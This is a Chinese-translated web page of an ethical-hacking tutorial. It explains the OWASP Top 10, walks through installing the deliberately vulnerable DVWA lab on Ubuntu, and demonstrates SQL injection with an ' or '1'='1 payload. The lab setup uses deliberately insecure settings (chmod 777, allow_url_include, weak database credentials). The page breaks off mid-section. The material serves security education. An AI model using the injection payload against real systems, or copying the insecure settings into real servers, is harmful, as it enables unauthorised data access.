<html>
<head>
<title>OWASP Top 10 and DVWA</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">OWASP十大和DVWA</h1>
<blockquote>原文：<a href="https://levelup.gitconnected.com/ethical-hacking-part-1-owasp-top-10-and-dvwa-3f2d55580ba8?source=collection_archive---------0-----------------------#2020-09-30">https://levelup.gitconnected.com/ethical-hacking-part-1-owasp-top-10-and-dvwa-3f2d55580ba8?source=collection_archive---------0-----------------------#2020-09-30</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="a994" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">了解风险以防止攻击的道德黑客——开放Web应用程序安全项目(OWASP)前10名和该死的易受攻击Web应用程序(DVWA)</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ki"><img src="../Images/4cbff737f64ee3c5355a355b9bd6dfa3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UJZPySDP-tEonnesSAbLgA.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">来自Adobe Stock的许可图像</figcaption></figure><p id="9fac" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">如果您打算深入研究道德黑客的世界，特别是web应用程序渗透“pen”测试，一个好的起点是了解什么是OWASP，更具体地说是OWASP Top 10。</p><p id="c8d4" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">“<a class="ae lu" href="https://owasp.org/" rel="noopener ugc nofollow" target="_blank">开放网络应用安全项目(OWASP) </a>是一个致力于提高软件安全性的非营利性基金会。通过社区主导的开源软件项目、全球数百个地方分会、数万名会员以及领先的教育和培训会议，OWASP基金会成为开发人员和技术人员保护网络安全的来源。”— <a class="ae lu" href="https://owasp.org/" rel="noopener ugc nofollow" target="_blank"> OWASP基金会</a></p><p id="6e4c" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">“<a class="ae lu" href="https://owasp.org/www-project-top-ten" rel="noopener ugc nofollow" target="_blank"> OWASP前10名</a>是面向开发人员和web应用程序安全性的标准意识文档。它代表了对web应用程序最关键的安全风险的广泛共识。</p><p id="8357" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">公司应该采纳这份文件，并开始确保他们的网络应用程序将这些风险降至最低。使用OWASP Top 10 可能是将您组织内的软件开发文化转变为产生更安全代码的最有效的第一步。“— <a class="ae lu" href="https://owasp.org/" rel="noopener ugc nofollow" target="_blank"> OWASP基金会</a></p><p id="5814" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><a class="ae lu" href="https://owasp.org/www-project-top-ten" rel="noopener ugc nofollow" target="_blank"> OWASP前10名</a>由<a class="ae lu" href="https://owasp.org/" rel="noopener ugc nofollow" target="_blank"> OWASP基金会</a>描述如下:</p><p id="97a8" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><a class="ae lu" href="https://owasp.org/www-project-top-ten/" rel="noopener ugc nofollow" target="_blank"> <strong class="la iu">十大Web应用安全风险</strong> </a></p><ol class=""><li id="f5fe" class="lv lw it la b lb lc le lf lh lx ll ly lp lz lt ma mb mc md bi translated"><a class="ae lu" href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection" rel="noopener ugc nofollow" target="_blank"> <strong class="la iu">注射</strong> </a>。当不可信数据作为命令或查询的一部分发送到解释器时，会出现注入缺陷，如SQL、NoSQL、操作系统和LDAP注入。攻击者的恶意数据可以欺骗解释器执行非预期的命令或在没有适当授权的情况下访问数据。</li><li id="5bc2" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt ma mb mc md bi translated"><a class="ae lu" href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication" rel="noopener ugc nofollow" target="_blank"> <strong class="la iu">破认证</strong> </a>。与身份验证和会话管理相关的应用程序功能通常没有正确实现，这使得攻击者能够泄露密码、密钥或会话令牌，或者利用其他实现缺陷来临时或永久冒充其他用户的身份。</li><li id="7b0c" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt ma mb mc md bi translated"><a class="ae lu" href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure" rel="noopener ugc nofollow" target="_blank"> <strong class="la iu">敏感数据曝光</strong> </a>。许多web应用程序和API不能很好地保护敏感数据，如金融、医疗保健和PII。攻击者可能窃取或修改这种保护薄弱的数据，以进行信用卡欺诈、身份盗窃或其他犯罪。敏感数据可能会在没有额外保护(如静态加密或传输加密)的情况下遭到破坏，并且在与浏览器交换时需要采取特殊的预防措施。</li><li id="63f0" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt ma mb mc md bi translated"><a class="ae lu" href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-XML_External_Entities_(XXE)" rel="noopener ugc nofollow" target="_blank"><strong class="la iu">【XXE】XML外部实体</strong> </a>。许多旧的或配置不良的XML处理器评估XML文档中的外部实体引用。外部实体可通过文件URI处理程序、内部文件共享、内部端口扫描、远程代码执行和拒绝服务攻击来泄露内部文件。</li><li id="6c4a" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt ma mb mc md bi translated"><a class="ae lu" href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control" rel="noopener ugc nofollow" target="_blank"> <strong class="la iu">破坏访问控制</strong> </a>。对经过身份验证的用户被允许做什么的限制通常没有得到适当的执行。攻击者可以利用这些缺陷来访问未经授权的功能和/或数据，例如访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</li><li id="9df6" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt ma mb mc md bi translated"><a class="ae lu" href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration" rel="noopener ugc nofollow" target="_blank"> <strong class="la iu">安全误配置</strong> </a>。安全配置错误是最常见的问题。这通常是由不安全的默认配置、不完整或临时配置、开放式云存储、错误配置的HTTP头以及包含敏感信息的详细错误消息造成的。不仅必须安全地配置所有操作系统、框架、库和应用程序，而且必须及时地对它们进行修补/升级。</li><li id="1867" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt ma mb mc md bi translated"><a class="ae lu" href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" rel="noopener ugc nofollow" target="_blank"> <strong class="la iu">跨站脚本XSS </strong> </a>。每当应用程序在没有适当验证或转义的情况下在新网页中包含不受信任的数据，或者使用可以创建HTML或JavaScript的浏览器API使用用户提供的数据更新现有网页时，就会出现XSS漏洞。XSS允许攻击者在受害者的浏览器中执行脚本，从而劫持用户会话、篡改网站或将用户重定向到恶意网站。</li><li id="ba2a" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt ma mb mc md bi translated"><a class="ae lu" href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A8-Insecure_Deserialization" rel="noopener ugc nofollow" target="_blank"> <strong class="la iu">缺乏安全感</strong> </a>。不安全的反序列化通常会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，它们也可用于执行攻击，包括重放攻击、注入攻击和权限提升攻击。</li><li id="db67" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt ma mb mc md bi translated"><a class="ae lu" href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities" rel="noopener ugc nofollow" target="_blank"> <strong class="la iu">利用已知漏洞的组件</strong> </a>。库、框架和其他软件模块等组件以与应用程序相同的权限运行。如果易受攻击的组件被利用，这种攻击会导致严重的数据丢失或服务器接管。使用具有已知漏洞的组件的应用程序和API可能会破坏应用程序防御，并导致各种攻击和影响。</li><li id="c25e" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt ma mb mc md bi translated"><a class="ae lu" href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A10-Insufficient_Logging%252526Monitoring" rel="noopener ugc nofollow" target="_blank"> <strong class="la iu">记录不足&amp;监控不足</strong> </a>。日志记录和监控不足，加上与事件响应的集成缺失或无效，使得攻击者能够进一步攻击系统，保持持久性，转向更多系统，以及篡改、提取或破坏数据。大多数违规研究显示，检测违规的时间超过200天，通常是由外部方检测到的，而不是内部流程或监控。</li></ol><p id="44be" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">我将使用<a class="ae lu" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank">该死的易受攻击的Web应用程序(DVWA) </a>来演示其中的一些。这是一个免费的网络应用程序，它被故意设计成漏洞百出。我建议您自己下载并安装它，按照本教程进行操作，并亲自试用。</p><p id="a3ae" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">DVWA涵盖的漏洞有:</p><ul class=""><li id="f397" class="lv lw it la b lb lc le lf lh lx ll ly lp lz lt mj mb mc md bi translated">蛮力</li><li id="6ba8" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">命令注入</li><li id="d7c3" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">CSRF</li><li id="7e11" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">文件包含</li><li id="6c19" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">文件上传</li><li id="629d" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">不安全的验证码</li><li id="64cb" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">SQL注入</li><li id="3e30" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">SQL注入(盲)</li><li id="97e4" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">弱会话id</li><li id="8bce" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">XSS</li><li id="0776" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">XSS(反射)</li><li id="60d6" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">XSS(已存储)</li><li id="df9e" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">CSP旁路</li><li id="3306" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">Java Script语言</li></ul><p id="3bda" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">您可以使用其他专门构建的“错误”应用程序进行练习。</p><ul class=""><li id="6545" class="lv lw it la b lb lc le lf lh lx ll ly lp lz lt mj mb mc md bi translated"><a class="ae lu" href="http://www.itsecgames.com/" rel="noopener ugc nofollow" target="_blank"> bWAPP，或者一个<em class="mk">漏洞百出的网络应用</em>T3】</a></li><li id="c61d" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated"><a class="ae lu" href="https://sourceforge.net/projects/mutillidae/" rel="noopener ugc nofollow" target="_blank">小蛇二号</a></li><li id="dbae" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated"><a class="ae lu" href="http://webappsecmovies.sourceforge.net/webgoat/" rel="noopener ugc nofollow" target="_blank"> OWASP WebGoat </a></li></ul><p id="006d" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">如果你觉得这是一个挑战，这里列出了超过60个易受攻击的网络、移动和操作系统项目。</p><p id="d4cc" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">在这方面，我们有点被宠坏了，但我们将从<a class="ae lu" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>开始。初始设置有点棘手，所以我会告诉你。</p><p id="9e8a" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">我为我的DVWA环境使用了一个自由层<a class="ae lu" href="http://console.aws.amazon.com/ec2" rel="noopener ugc nofollow" target="_blank">Amazon EC2</a>Ubuntu Server 20.04(64位)实例。我推荐使用Ubuntu，因为我已经在本文中详细介绍了这些步骤。如果您愿意为您的系统配置相同的版本，您可以使用其他“风格”的Linux。你也不需要使用亚马逊EC2，如果你不想太。我只是觉得这是最快、最容易的配置方式，但是如果您愿意，您可以安装本地虚拟机(VirtualBox、VMWare等)或物理安装。</p><p id="ddda" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">一旦你的Ubuntu系统启动并运行，我们将需要配置Apache 2.4、MySQL服务器和带有MySQL扩展的PHP。请将以下用户配置为root用户或使用sudo。</p><pre class="kj kk kl km gt ml mm mn mo aw mp bi"><span id="cdbe" class="mq mr it mm b gy ms mt l mu mv"># <strong class="mm iu">apt-get update -y</strong><br/># <strong class="mm iu">apt-get upgrade -y</strong><br/># <strong class="mm iu">apt-get install apache2 mysql-server php php-gd</strong> <strong class="mm iu">php-mysql -y</strong></span><span id="68a8" class="mq mr it mm b gy mw mt l mu mv"># <strong class="mm iu">/etc/init.d/apache2 start</strong><br/># <strong class="mm iu">/etc/init.d/mysql start</strong></span><span id="f3f0" class="mq mr it mm b gy mw mt l mu mv"># <strong class="mm iu">update-rc.d apache2 defaults</strong><br/># <strong class="mm iu">update-rc.d mysql defaults</strong></span></pre><p id="2ca5" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">现在，我们可以提供最新版本的DVWA。</p><pre class="kj kk kl km gt ml mm mn mo aw mp bi"><span id="75b9" class="mq mr it mm b gy ms mt l mu mv"># <strong class="mm iu">cd /var/www/html</strong><br/># <strong class="mm iu">git clone </strong><a class="ae lu" href="https://github.com/ethicalhack3r/DVWA" rel="noopener ugc nofollow" target="_blank"><strong class="mm iu">https://github.com/digininja/DVWA</strong></a></span><span id="e68c" class="mq mr it mm b gy mw mt l mu mv"># <strong class="mm iu">chmod -R 777 /var/www/html/DVWA</strong>   &lt;--   yes, not a mistake -- 777</span><span id="f6ee" class="mq mr it mm b gy mw mt l mu mv"># <strong class="mm iu">mv /var/www/html/DVWA/config/config.inc.php.dist /var/www/html/DVWA/config/config.inc.php</strong></span></pre><p id="6559" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">我们将使用MySQL作为DVWA的数据库，所以我们需要确保它有一个基本配置。</p><pre class="kj kk kl km gt ml mm mn mo aw mp bi"><span id="5538" class="mq mr it mm b gy ms mt l mu mv"># <strong class="mm iu">mysql -u root -p</strong><br/>Enter password: <br/>Welcome to the MySQL monitor.  Commands end with ; or \g.<br/>Your MySQL connection id is 8<br/>Server version: 8.0.21-0ubuntu0.20.04.4 (Ubuntu)</span><span id="c423" class="mq mr it mm b gy mw mt l mu mv">Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.</span><span id="851a" class="mq mr it mm b gy mw mt l mu mv">Oracle is a registered trademark of Oracle Corporation and/or its<br/>affiliates. Other names may be trademarks of their respective<br/>owners.</span><span id="7ca7" class="mq mr it mm b gy mw mt l mu mv">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span><span id="cbeb" class="mq mr it mm b gy mw mt l mu mv">mysql&gt; <strong class="mm iu">CREATE DATABASE dvwa;</strong><br/>Query OK, 1 row affected (0.00 sec)</span><span id="6986" class="mq mr it mm b gy mw mt l mu mv">mysql&gt; <strong class="mm iu">CREATE USER 'user'@'127.0.0.1' IDENTIFIED BY 'pass';</strong><br/>Query OK, 0 rows affected (0.01 sec)</span><span id="e29b" class="mq mr it mm b gy mw mt l mu mv">mysql&gt; <strong class="mm iu">GRANT ALL ON dvwa.* TO 'user'@'127.0.0.1';</strong><br/>Query OK, 0 rows affected (0.00 sec)</span><span id="cd0d" class="mq mr it mm b gy mw mt l mu mv">mysql&gt; <strong class="mm iu">FLUSH PRIVILEGES;</strong><br/>Query OK, 0 rows affected (0.00 sec)</span><span id="e8de" class="mq mr it mm b gy mw mt l mu mv">mysql&gt; <strong class="mm iu">EXIT;</strong><br/>Bye</span></pre><p id="5a1f" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">我们需要对php.ini文件进行一些修改。不要问我为什么，虽然我可以看到当我从命令行运行"<strong class="la iu">PHP-ini</strong>时"<strong class="la iu">/etc/PHP/7.4/Apache 2/PHP . ini</strong>"没有加载，但是如果您没有在中对"<strong class="la iu"><em class="mk">allow _ URL _ fopen</em></strong>"和"<strong class="la iu"><em class="mk">allow _ URL _ include</em></strong>"进行更改</p><ul class=""><li id="b449" class="lv lw it la b lb lc le lf lh lx ll ly lp lz lt mj mb mc md bi translated">/etc/php/7.4/cli/php.ini</li><li id="5f47" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">/etc/php/7.4/apache2/php.ini</li></ul><pre class="kj kk kl km gt ml mm mn mo aw mp bi"><span id="a49f" class="mq mr it mm b gy ms mt l mu mv">allow_url_fopen = On<br/>allow_url_include = On<br/>extension=mysqli</span></pre><p id="3f41" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">完成后，重新启动Apache。</p><pre class="kj kk kl km gt ml mm mn mo aw mp bi"><span id="2fc2" class="mq mr it mm b gy ms mt l mu mv"># <strong class="mm iu">/etc/init.d/apache2 restart</strong><br/>Restarting apache2 (via systemctl): apache2.service.</span></pre><p id="0680" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">我们现在需要更新DVWA配置文件:<strong class="la iu">/var/www/html/DVWA/config/config . Inc . PHP</strong></p><p id="c1a2" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">在此之前还有一项任务要做。DVWA有一个reCAPTCHA组件。你需要去<a class="ae lu" href="https://www.google.com/recaptcha/admin/create" rel="noopener ugc nofollow" target="_blank"> Google reCaptcha </a>获取你的公钥和私钥。这是非常快速和无痛的。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi mx"><img src="../Images/7b95bfc04060ac0746477bff5732f584.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3sK_tt7ep159IBgsUOLMzw.png"/></div></div></figure><p id="7936" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">记下您的“<strong class="la iu">站点密钥</strong>和“<strong class="la iu">秘密密钥</strong>”。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi my"><img src="../Images/df92d85adff5acce2468056c841e723e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*abFKYBmg4fPkaKbdnABCAA.png"/></div></div></figure><p id="98ea" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">请在您的“<strong class="la iu">/var/www/html/DVWA/config/config . Inc . PHP</strong>”文件中进行以下更新:</p><pre class="kj kk kl km gt ml mm mn mo aw mp bi"><span id="da51" class="mq mr it mm b gy ms mt l mu mv">$_DVWA[ 'db_server' ]   = '127.0.0.1';<br/>$_DVWA[ 'db_database' ] = 'dvwa';<br/>$_DVWA[ 'db_user' ]     = 'user';<br/>$_DVWA[ 'db_password' ] = 'pass';</span><span id="8571" class="mq mr it mm b gy mw mt l mu mv">$_DVWA[ 'recaptcha_public_key' ]  = '<strong class="mm iu"><em class="mk">SITE KEY</em></strong>';<br/>$_DVWA[ 'recaptcha_private_key' ] = '<strong class="mm iu"><em class="mk">SECRET KEY</em></strong>';</span></pre><p id="ee18" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">立即浏览您的DVWA网站:<strong class="la iu"> http://SERVER_IP/DVWA </strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi mz"><img src="../Images/fb7d510dd3599850a626d3cc989ca8c2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0tChBDUPrZBUTOQNnrrZPw.png"/></div></div></figure><p id="65f0" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">默认登录凭据:</p><p id="4782" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">用户名:<strong class="la iu">管理员</strong> <br/>密码:<strong class="la iu">密码</strong></p><p id="9964" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">首次登录时，您将看到这个setup.php页面。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi na"><img src="../Images/19f0ef9404670a59439c9971677173c1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sLE6yfXES4YOkBj3BDYRrg.png"/></div></div></figure><p id="0a2d" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">现在，理想情况下，如果到目前为止一切都按计划进行，您的设置页面应该看起来像上面一样，所有相关项目都是“绿色”的。如果是，则点击“<strong class="la iu">创建/重置数据库</strong>”完成MySQL数据库的配置。</p><p id="d514" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">DVWA可以在多种模式下工作，默认模式是最安全的“<strong class="la iu">不可能</strong>”。您需要单击“<strong class="la iu"> DVWA安全</strong>”菜单项，并将安全级别更改为“<strong class="la iu">低</strong>”，以模拟典型的易受攻击的应用程序。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nb"><img src="../Images/7cda76a8ef3bb5d43604576dc35bceb7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*E52cviRFhUKBEBU3L_wItg.png"/></div></div></figure><p id="fce9" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">这就是完成的设置:)</p><p id="805b" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">所以回到我们的OWASP前10名，以及如何用一个实际的易受攻击的应用程序来演示每一个。</p><p id="169f" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la iu"> 1 —“注入”或更常见的“SQL注入”</strong></p><p id="ff6d" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">作为一名开发人员，您永远不应该基于用户输入构建SQL查询。</p><pre class="kj kk kl km gt ml mm mn mo aw mp bi"><span id="9f49" class="mq mr it mm b gy ms mt l mu mv">SELECT first_name, last_name FROM users WHERE user_id = '$id';</span></pre><p id="21c3" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">您应该始终使用所有主流编程语言都包含的“绑定”。</p><pre class="kj kk kl km gt ml mm mn mo aw mp bi"><span id="39f5" class="mq mr it mm b gy ms mt l mu mv">$sql = 'SELECT first_name, last_name FROM users WHERE user_id = :id';</span><span id="67b3" class="mq mr it mm b gy mw mt l mu mv">*** then bind :id to $id ***</span></pre><p id="180d" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">在DVWA应用程序中，点击“<strong class="la iu"> SQL注入</strong>”菜单项。如果您在<em class="mk">文本框</em>中键入用户ID 1，然后单击<strong class="la iu">提交</strong>，您将看到它检索到ID为1的第一个用户。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nc"><img src="../Images/72f241cd0e1963208bcd6694fb23c92e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pMyGnRdGCfGvgplZAI0y9w.png"/></div></div></figure><p id="e479" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">这看起来相当安全，对吗？…错了</p><p id="e9d9" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">当您单击“<strong class="la iu">提交</strong>”时，此查询中的“<strong class="la iu"> 1 </strong>”将被翻译成“<strong class="la iu"> $id </strong>”变量。</p><pre class="kj kk kl km gt ml mm mn mo aw mp bi"><span id="da85" class="mq mr it mm b gy ms mt l mu mv">SELECT first_name, last_name FROM users WHERE user_id = '$id';</span><span id="b1b8" class="mq mr it mm b gy mw mt l mu mv"><strong class="mm iu">SELECT first_name, last_name FROM users WHERE user_id = '1';</strong></span></pre><p id="7cf5" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">但是如果我们将它提交到<em class="mk">文本框</em> : <br/> <strong class="la iu">或‘1’=‘1</strong>中会怎么样呢</p><p id="358f" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">现在将被翻译成这个。</p><pre class="kj kk kl km gt ml mm mn mo aw mp bi"><span id="7fd7" class="mq mr it mm b gy ms mt l mu mv">SELECT first_name, last_name FROM users WHERE user_id = '$id';</span><span id="d92f" class="mq mr it mm b gy mw mt l mu mv"><strong class="mm iu">SELECT first_name, last_name FROM users WHERE user_id = '' or '1'='1';</strong></span></pre><p id="09d2" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">因为<strong class="la iu"> '1' = '1' </strong>这将检索数据库中的所有用户！</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi na"><img src="../Images/4cee93095bf45e3f3b0cc7e2fa84e03f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QZP5HUUO1rsZrzg3tjh8Hw.png"/></div></div></figure><p id="aff6" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">除了有严重的数据泄露之外，还可能包含可以删除或更新数据的SQL。如果MySQL使用的是根用户，那就更糟了，因为您可以无限制地控制整个数据库，而不仅仅是本例中的“dvwa”数据库。</p><p id="905c" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la iu"> 2 —身份验证被破坏</strong></p><p id="f09e" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">此攻击与糟糕的用户身份验证和会话管理有关。</p><p id="af6a" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">示例:</p><ul class=""><li id="16ac" class="lv lw it la b lb lc le lf lh lx ll ly lp lz lt mj mb mc md bi translated">允许密码被“暴力破解”,允许快速连续地无限制尝试。</li><li id="d6cf" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">仅依靠密码来保护应用程序—没有多因素身份认证(2FA)</li><li id="dabf" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">无会话超时—用户使用公共资源</li></ul><p id="73a9" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la iu"> 3 —敏感数据暴露</strong></p><p id="9c3d" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">这种攻击与没有采取适当的措施来保护静态或传输中的敏感数据有关。</p><p id="9694" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi 